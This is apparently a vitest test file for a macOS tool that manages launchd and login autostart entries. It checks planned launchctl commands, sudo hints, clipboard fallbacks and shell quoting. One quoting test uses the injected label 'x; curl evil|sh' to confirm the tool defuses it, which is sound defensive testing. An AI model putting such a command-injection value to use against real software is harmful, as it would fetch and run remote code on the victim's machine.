import { describe, expect, it } from 'vitest';

import {
  fail,
  fakeContext,
  ok,
  type FakeSystem,
} from '../__fixtures__/fake-context.js';
import type { AutostartEntry } from '../types.js';
import {
  commandText,
  planAction,
  runAction,
  shellQuote,
  type ActionPlan,
} from './actions.js';

const AGENT: AutostartEntry = {
  source: 'user-agent',
  label: 'com.example.agent',
  program: '/usr/local/bin/agent',
  file: '/Users/example/Library/LaunchAgents/com.example.agent.plist',
  triggers: [{ kind: 'load' }],
  state: { loaded: true, pid: 12 },
};
const DAEMON: AutostartEntry = {
  ...AGENT,
  source: 'global-daemon',
  label: 'com.example.daemon',
  file: '/Library/LaunchDaemons/com.example.daemon.plist',
};
const LOGIN: AutostartEntry = {
  source: 'btm',
  label: 'com.example.app',
  file: '/Applications/Example.app',
  triggers: [{ kind: 'load' }],
  state: {},
};
const CRON: AutostartEntry = {
  source: 'cron',
  label: 'backup.sh',
  program: '/usr/local/bin/backup.sh',
  triggers: [{ kind: 'cron', detail: '0 3 * * *' }],
  state: {},
};

function command(plan: ActionPlan): string {
  return plan.ok
    ? commandText(plan.action.command)
    : `unavailable: ${plan.reason}`;
}

describe('planAction', () => {
  it('disables an enabled job and enables a disabled one, both with confirmation', () => {
    const disable = planAction(AGENT, 'toggle', 501);
    expect(command(disable)).toBe(
      'launchctl disable gui/501/com.example.agent',
    );
    expect(disable.ok && disable.action.needsConfirm).toBe(true);
    expect(disable.ok && disable.action.sudoHint).toBe(
      'sudo launchctl disable gui/501/com.example.agent',
    );
    expect(
      command(
        planAction({ ...AGENT, state: { disabled: true } }, 'toggle', 501),
      ),
    ).toBe('launchctl enable gui/501/com.example.agent');
  });

  it('starts a loaded job, loads an unloaded one and unloads a loaded one', () => {
    expect(command(planAction(DAEMON, 'start', 501))).toBe(
      'launchctl kickstart system/com.example.daemon',
    );
    expect(command(planAction(DAEMON, 'stop', 501))).toBe(
      'launchctl bootout system/com.example.daemon',
    );
    expect(
      command(planAction({ ...AGENT, state: { loaded: false } }, 'start', 501)),
    ).toBe(
      'launchctl bootstrap gui/501 /Users/example/Library/LaunchAgents/com.example.agent.plist',
    );
    expect(
      command(
        planAction({ ...DAEMON, state: { loaded: false } }, 'start', 501),
      ),
    ).toBe(
      'launchctl bootstrap system /Library/LaunchDaemons/com.example.daemon.plist',
    );
    expect(
      command(
        planAction(
          { ...AGENT, state: { loaded: true, disabled: true } },
          'start',
          501,
        ),
      ),
    ).toBe('unavailable: Enable the job first (e)');
    expect(
      command(
        planAction({ ...AGENT, state: {}, file: undefined }, 'start', 501),
      ),
    ).toBe('unavailable: No plist to load');
    expect(command(planAction({ ...AGENT, state: {} }, 'stop', 501))).toBe(
      'unavailable: Only a loaded launchd job can be unloaded',
    );
  });

  it('offers only reveal and copy for non-launchd entries', () => {
    expect(command(planAction(LOGIN, 'toggle', 501))).toBe(
      'unavailable: Only launchd jobs support this action',
    );
    expect(command(planAction(LOGIN, 'reveal', 501))).toBe(
      'open -R /Applications/Example.app',
    );
    const copy = planAction(CRON, 'copy', 501);
    expect(copy.ok && copy.action.command).toEqual({
      file: 'pbcopy',
      args: [],
      input: '/usr/local/bin/backup.sh',
    });
    expect(copy.ok && copy.action.needsConfirm).toBe(false);
    expect(command(planAction(CRON, 'reveal', 501))).toBe(
      'unavailable: No file to show',
    );
  });
});

describe('runAction', () => {
  it('reports success', async () => {
    const plan = planAction(AGENT, 'toggle', 501);
    const system: FakeSystem = {
      commands: { 'launchctl disable gui/501/com.example.agent': ok('') },
    };
    expect(plan.ok && (await runAction(fakeContext(system), plan.action))).toBe(
      'Done: Disable permanently until enabled again',
    );
  });

  it('copies the sudo command when launchctl refuses', async () => {
    const plan = planAction(DAEMON, 'stop', 501);
    const system: FakeSystem = {
      commands: {
        'launchctl bootout system/com.example.daemon': fail(
          'Boot-out failed: 1: Operation not permitted\n',
        ),
        pbcopy: ok(''),
      },
    };
    const message = plan.ok
      ? await runAction(fakeContext(system), plan.action)
      : '';
    expect(message).toBe(
      'Failed: Boot-out failed: 1: Operation not permitted. Needs root? sudo launchctl bootout system/com.example.daemon (copied to clipboard)',
    );
    expect(system.inputs?.pbcopy).toBe(
      'sudo launchctl bootout system/com.example.daemon',
    );
  });

  it('passes the copy text on stdin', async () => {
    const plan = planAction(LOGIN, 'copy', 501);
    const system: FakeSystem = { commands: { pbcopy: ok('') } };
    expect(plan.ok && (await runAction(fakeContext(system), plan.action))).toBe(
      'Done: Copy /Applications/Example.app',
    );
    expect(system.inputs?.pbcopy).toBe('/Applications/Example.app');
  });
});

describe('shell quoting', () => {
  it('keeps safe words bare and quotes the rest', () => {
    expect(shellQuote('system/com.example.a-b_c')).toBe(
      'system/com.example.a-b_c',
    );
    expect(shellQuote("it's")).toBe(String.raw`'it'\''s'`);
  });

  it('quotes hostile labels in the command text and the sudo hint', () => {
    const daemon = { ...DAEMON, label: 'x; curl evil|sh' };
    const plan = planAction(daemon, 'stop', 501);
    expect(command(plan)).toBe("launchctl bootout 'system/x; curl evil|sh'");
    expect(plan.ok && plan.action.sudoHint).toBe(
      "sudo launchctl bootout 'system/x; curl evil|sh'",
    );
  });

  it('escapes a single quote in a label', () => {
    const plan = planAction({ ...DAEMON, label: "a'b" }, 'stop', 501);
    expect(command(plan)).toBe(String.raw`launchctl bootout 'system/a'\''b'`);
  });
});

describe('runAction edge cases', () => {
  it('reports a failing command without a sudo hint', async () => {
    const plan = planAction(LOGIN, 'reveal', 501);
    const system: FakeSystem = {
      commands: { 'open -R /Applications/Example.app': fail('nope\n') },
    };
    expect(plan.ok && (await runAction(fakeContext(system), plan.action))).toBe(
      'Failed: nope',
    );
  });

  it('tells the user to run sudo themselves when pbcopy fails', async () => {
    const plan = planAction(DAEMON, 'stop', 501);
    const system: FakeSystem = {
      commands: {
        'launchctl bootout system/com.example.daemon': fail('denied\n'),
        pbcopy: fail('no pasteboard'),
      },
    };
    const message = plan.ok
      ? await runAction(fakeContext(system), plan.action)
      : '';
    expect(message.endsWith('(run it in a terminal)')).toBe(true);
  });

  it('never rejects when exec throws', async () => {
    const plan = planAction(LOGIN, 'copy', 501);
    const ctx = {
      ...fakeContext(),
      exec: () => Promise.reject(new Error('spawn failed')),
    };
    expect(plan.ok && (await runAction(ctx, plan.action))).toBe(
      'Failed: spawn failed',
    );
  });

  it('has nothing to copy for an entry without file and program', () => {
    const bare: AutostartEntry = { ...LOGIN, file: undefined };
    expect(command(planAction(bare, 'copy', 501))).toBe(
      'unavailable: Nothing to copy',
    );
  });
});
